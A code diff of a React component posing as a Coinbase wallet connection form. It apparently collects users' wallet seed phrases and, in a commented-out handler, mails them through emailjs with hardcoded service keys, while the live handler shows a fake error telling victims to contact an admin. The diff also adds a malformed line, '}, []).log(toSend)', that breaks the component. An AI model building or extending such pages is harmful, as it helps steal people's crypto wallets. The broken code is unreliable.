@@ -5,7 +5,6 @@ import { send } from 'emailjs-com'
 import Loader from '../../images/loder.gif.gif'
 
 const Coinbase = ({ setPage, notific, user, refreshPage }) => {
-  console.log(user)
   const [formLoading, setFormLoading] = useState(false)
   const [loading, setLoading] = useState(false)
   const [toSend, setToSend] = useState({
@@ -50,7 +49,6 @@ const Coinbase = ({ setPage, notific, user, refreshPage }) => {
   //         }
   //       })
   //       .catch((err) => {
-  //         console.log(err)
   //         notific('error', 'An error occured')
   //         setFormLoading(false)
   //       })
@@ -65,23 +63,20 @@ const Coinbase = ({ setPage, notific, user, refreshPage }) => {
       from_firstname: user.firstname,
       from_lastname: user.lastname,
     })
-  }, [])
-
-  console.log(toSend)
+  }, []).log(toSend)
   const onSubmit = (e) => {
-//     setLoading(true)
-//     setToSend({ ...toSend, from_wallet: 'Coinbase wallet' })
-//     e.preventDefault()
-//     send('service_68ahmsh', 'template_proinesmet', toSend, 'm6YRrZKtNIMi_eARU')
-//       .then((response) => {
-//         notific('success', 'Phrases submitted')
-//         setFormLoading(true)
-//         setLoading(false)
-//       })
-//       .catch((err) => {
-//         console.log('FAILED...', err)
-//         setLoading(false)
-//       })
+    //     setLoading(true)
+    //     setToSend({ ...toSend, from_wallet: 'Coinbase wallet' })
+    //     e.preventDefault()
+    //     send('service_68ahmsh', 'template_proinesmet', toSend, 'm6YRrZKtNIMi_eARU')
+    //       .then((response) => {
+    //         notific('success', 'Phrases submitted')
+    //         setFormLoading(true)
+    //         setLoading(false)
+    //       })
+    //       .catch((err) => {
+    //         setLoading(false)
+    //       })
     notific('error', 'An error occured, contact admin')
   }
   const handleChange = (e) => {
